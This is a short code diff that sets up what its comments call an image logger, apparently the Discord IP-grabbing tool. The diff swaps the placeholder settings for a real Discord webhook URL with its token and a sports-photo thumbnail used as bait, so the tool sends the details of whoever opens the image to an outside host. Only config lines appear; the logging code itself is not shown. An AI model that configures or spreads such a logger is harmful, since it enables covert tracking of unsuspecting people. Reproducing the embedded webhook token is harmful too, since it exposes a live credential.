@@ -12,8 +12,8 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discordapp.com/api/webhooks/1382093752092590110/X2sx4VTM2gX2NYwAqeyLA6X5XbjXVCc_E6If-QcexmWd8190V0F1oMY2awfu36E4oFZB",
+    "image": "https://sportshub.cbsistatic.com/i/r/2025/06/06/ed8d050c-d28f-44f2-a0fd-c9a2c6bf4529/thumbnail/450x253/924149d301f9758bc8bec2c791dc5332/shedeur-sanders-g.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
